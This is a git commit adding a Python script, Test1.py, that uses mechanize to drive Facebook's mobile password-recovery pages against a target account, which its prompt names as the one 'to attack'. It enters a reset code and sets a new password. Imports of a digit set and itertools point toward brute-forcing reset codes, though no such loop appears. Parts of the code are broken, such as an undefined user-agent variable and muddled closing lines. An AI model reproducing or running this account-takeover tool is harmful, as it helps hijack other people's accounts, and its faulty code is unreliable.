c06ea02a55502251a14e8a7758779b3cab332476
krarktel <52972778+krarktel@users.noreply.github.com>
2024-08-22 10:09:51 -0400

    Create Test1.py

---
+++ Test1.py
@@ -0,0 +1,45 @@
+import itertools
+import sys
+from time import sleep
+from bs4 import BeautifulSoup
+
+import mechanize
+
+CHRS = '0123456789'
+
+soup = BeautifulSoup()
+email = input('Email address or username to attack:')
+"""password = input('Password:')"""
+reset = input('Reset:')
+browser = mechanize.Browser()
+browser.set_handle_robots(False)
+cookies = mechanize.CookieJar()
+browser.set_cookiejar(cookies)
+browser.addheaders = [('User-agent', MOZILLA_UAS)]
+browser.set_handle_refresh(False)
+browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+browser.select_form(nr=0)
+browser.form['email'] = email
+browser.submit()
+"""selection confirmation"""
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+forms = list(browser.forms())
+form = forms[0]
+print(form)
+y = input('Continue? 1,2, else:')
+"""reset code input"""
+reset = input('Code: ')
+browser.form['n'] = reset
+browser.submit()
+"""new password"""
+new = input('New Password: ')
+browser.select_form(nr=0)
+browser.select_form(nr=0)
+browser.form['password_new'] = new
+browser.form.set_value(reset, nr=2)
+soup.find(string='password_new')
